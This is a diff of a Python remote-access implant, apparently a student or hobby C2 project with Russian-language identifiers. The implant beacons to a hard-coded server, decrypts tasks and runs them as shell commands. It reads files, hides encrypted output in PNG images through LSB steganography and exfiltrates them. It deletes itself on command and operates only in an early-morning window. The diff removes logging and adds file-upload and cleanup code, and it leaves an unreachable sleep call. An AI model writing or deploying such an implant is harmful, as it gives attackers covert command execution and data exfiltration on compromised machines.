@@ -3,7 +3,7 @@ from stegano import lsb
 import uuid
 import requests
 import subprocess
-import time as время
+import time
 import sys
 from datetime import datetime, time as dtime
 import os
@@ -16,147 +16,127 @@ from diffiehellman import DiffieHellman
 
 глобальный_ключ = None
 
-ссылка = "http://localhost:80/" #remember to change this to the actual IP address of machine running the C2 Server.
+ссылка = "http://192.168.20.9:80/"
 
 маршруты = {
-    0: ссылка + "feed.com", #task
-    1: ссылка + "upload_photo.com", #upload
-    2: ссылка + "login.com", #getkey
-    3: ссылка + "auth.com" #sendkey
+    0: ссылка + "feed.com",        # task
+    1: ссылка + "upload_photo.com",# upload
+    2: ссылка + "login.com",       # getkey
+    3: ссылка + "auth.com"         # sendkey
 }
 
-def проверить_интервал(): 
+def проверить_интервал():
     текущее_время = datetime.now().hour
-    if текущее_время >= 2 and текущее_время <= 10: 
+    if текущее_время >= 2 and текущее_время <= 10:
         return True
-    print(f"{КРАСНЫЙ}[!]{СБРОС} Nyet.")
     return False
+    time.sleep(60)
 
-def зашифровать(открытый_текст):  
-    дополнение = 16 - (len(открытый_текст) % 16)
+def зашифровать(строка):
+    дополнение = 16 - (len(строка) % 16)
     шифр = AES.new(глобальный_ключ, AES.MODE_CBC)
-    байты_текста = открытый_текст.encode() + (дополнение.to_bytes(1, "big") * дополнение)
-    зашифрованное = шифр.encrypt(байты_текста)
-    print(f"{СТАТУС}[*]{СБРОС} Encrypted Message")
-    return (зашифрованное + шифр.iv).decode("latin-1")
+    открытый_текст = строка.encode() + (дополнение.to_bytes(1, "big") * дополнение)
+    зашифр = шифр.encrypt(открытый_текст)
+    return (зашифр + шифр.iv).decode("latin-1")
 
-def расшифровать(зашифрованный_текст): 
-    зашифрованный_текст = зашифрованный_текст.encode("latin-1")
-    инициализационный_вектор = зашифрованный_текст[-16:]
-    шифр = AES.new(глобальный_ключ, AES.MODE_CBC, инициализационный_вектор)
-    сообщение = зашифрованный_текст[:-16]
+def расшифровать(текст):
+    текст = текст.encode("latin-1")
+    iv = текст[-16:]
+    шифр = AES.new(глобальный_ключ, AES.MODE_CBC, iv)
+    сообщение = текст[:-16]
     открытый_текст = шифр.decrypt(сообщение)
     открытый_текст = открытый_текст[:-открытый_текст[len(открытый_текст)-1]]
-    print(f"{СТАТУС}[*]{СБРОС} Command: {открытый_текст.decode()}")
     return открытый_текст.decode()
 
-#str is the encrypted string of data that needs to be hidden in a file. 
-def изменить_изображение(сообщение): #mod_img
+def изменить_изображение(сообщение):
     путь = "./images/"
-    имя_файла = "safari-bird-1"
-    закодированное_изображение = lsb.hide(f"{путь}{имя_файла}.png", сообщение)
-    закодированное_изображение.save(f"{путь}{имя_файла}-final.png")
+    имя_файла = "safari-bird"
+    закодированное = lsb.hide(f"{путь}{имя_файла}.png", сообщение)
+    закодированное.save(f"{путь}{имя_файла}-final.png")
     return f"{путь}{имя_файла}-final.png"
 
-#Execute command 
-def выполнить(команда): #exec
+def выполнить(команда):
     результат = ""
     if команда == "sleep 10":
-        print(f"{СТАТУС}[*]{СБРОС} Sleeping...")
-        время.sleep(10)
+        time.sleep(10)
     else:
-        список_команд = команда.split()
-        if список_команд[0] == "destroy":
+        список = команда.split()
+        if список[0] == "destroy":
             уничтожить()
-        elif список_команд[0] == "upload":
-            print(f"[+] Reading {список_команд[1]}")
-            pass
-        else:
-            print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Executing command: %s" % команда)
-            вывод = subprocess.run(список_команд, capture_output=True, text=True)
+        elif список[0] == "upload":
+            вывод = subprocess.run(["cat", список[1]], capture_output=True, text=True)
             результат = вывод.stdout
-            print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Result: %s" % результат)
-    return результат
+        else:
+            вывод = subprocess.run(список, capture_output=True, text=True)
+            результат = вывод.stdout
+    return результат[:4000]
 
-#Sending output back to C2Server 
-def отправить_результат(обфусцированное_изображение): #send_output
-    print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Sending image back to server...")
-    requests.post(маршруты[1], files={"file": open(обфусцированное_изображение, 'rb')})
+def отправить_вывод(изображение):
+    requests.post(маршруты[1], files={"file": open(изображение, 'rb')})
     return
 
-#Called to clean up and destroy implant
-def уничтожить(): #destroy
-    путь_импланта = os.path.abspath(__file__)
-    subprocess.Popen(f"rm -f '{{file_path}}'", shell=True)
+def уничтожить():
+    расположение = os.path.abspath(__file__)
+    subprocess.Popen(f"rm -rf images", shell=True)
+    subprocess.Popen(f"rm -f '{расположение}'", shell=True)
     sys.exit(0)
 
-def распределить_ключ(): #key_dist
+def распределение_ключа():
     global глобальный_ключ
-    response = requests.get(маршруты[2])
-    response = response.json()
-    публичный_ключ_сервера = response["key"].encode("latin-1")
+    ответ = requests.get(маршруты[2])
+    ответ = ответ.json()
+    публичный_ключ_сервера = ответ["key"].encode("latin-1")
 
-    dh = DiffieHellman(group=14, key_bits=540)
-    мой_публичный_ключ = dh.get_public_key()
-    объект_для_отправки = {"key": мой_публичный_ключ.decode("latin-1")}
-    requests.post(маршруты[3], json=объект_для_отправки)
+    дх = DiffieHellman(group=14, key_bits=540)
+    публичный_ключ = дх.get_public_key()
+    json_объект = {"key": публичный_ключ.decode("latin-1")}
+    requests.post(маршруты[3], json=json_объект)
 
-    глобальный_ключ = dh.generate_shared_key(публичный_ключ_сервера)[:16]
-    print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Derived AES key")
+    глобальный_ключ = дх.generate_shared_key(публичный_ключ_сервера)[:16]
     return
 
-#Setting up initial connection with C2 Server
-def инициализация(): #init
+def инициализация():
     попытки = 0
     while попытки < 3:
-        print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Contacting Server...")
         try:
             ответ = requests.get(ссылка)
-            print(f"{ЗЕЛЕНЫЙ}[+]{СБРОС} Connection Established...")
-            print(ответ.text)
-            распределить_ключ()
+            распределение_ключа()
             return
         except Exception as e:
-            print(f"{КРАСНЫЙ}[-]{СБРОС} Error in Contacting Server...")
             попытки += 1
-    print(f"{КРАСНЫЙ}[-]{СБРОС} Failure in establishing connection.")
     уничтожить()
     exit(1)
 
-#Gets task from GET request and executes 
-def разобрать_json(ответ): #parse_json
-    json_объект = ответ.json()
+def разобрать_json(ответ):
+    результат_json = ответ.json()
     команда = ""
-    if json_объект["task"] == None:
-        print(f"{КРАСНЫЙ}[-]{СБРОС} Error in parsing JSON.")
+    if результат_json["task"] == None:
         команда = "echo 0"
     else:
-        команда = json_объект["task"]
+        команда = результат_json["task"]
     return команда
 
-if __name__ == '__main__': #main
+if __name__ == '__main__':
     инициализация()
 
-    количество_попыток = 1
+    число_попыток = 1
     while True:
-        if not проверить_интервал(): 
-            время.sleep(60)
+        if not проверить_интервал():
             continue
         try:
             ответ = requests.get(маршруты[0])
-            зашифрованная_команда = разобрать_json(ответ)
-            команда = расшифровать(зашифрованная_команда)
-            результат = выполнить(команда)
-            if результат != "":
-                сообщение = зашифровать(результат)
-                обфусцированное_изображение = изменить_изображение(сообщение)
-                отправить_результат(обфусцированное_изображение)
-            количество_попыток = 1
+            зашифр_команда = разобрать_json(ответ)
+            команда = расшифровать(зашифр_команда)
+            вывод = выполнить(команда)
+            if вывод != "":
+                сообщение = зашифровать(вывод)
+                изображение = изменить_изображение(сообщение)
+                отправить_вывод(изображение)
+            число_попыток = 1
         except Exception as e:
-            if количество_попыток > 3:
-                print(f"{КРАСНЫЙ}[-]{СБРОС} Lost contact with server. Exiting...")
+            if число_попыток > 3:
                 break
             else:
-                время.sleep(количество_попыток * 15)
-                print(f"{КРАСНЫЙ}[-]{СБРОС} Could not contact server. Re-try #{количество_попыток}...")
-                количество_попыток += 1
+                time.sleep(число_попыток * 15)
+                число_попыток += 1
+
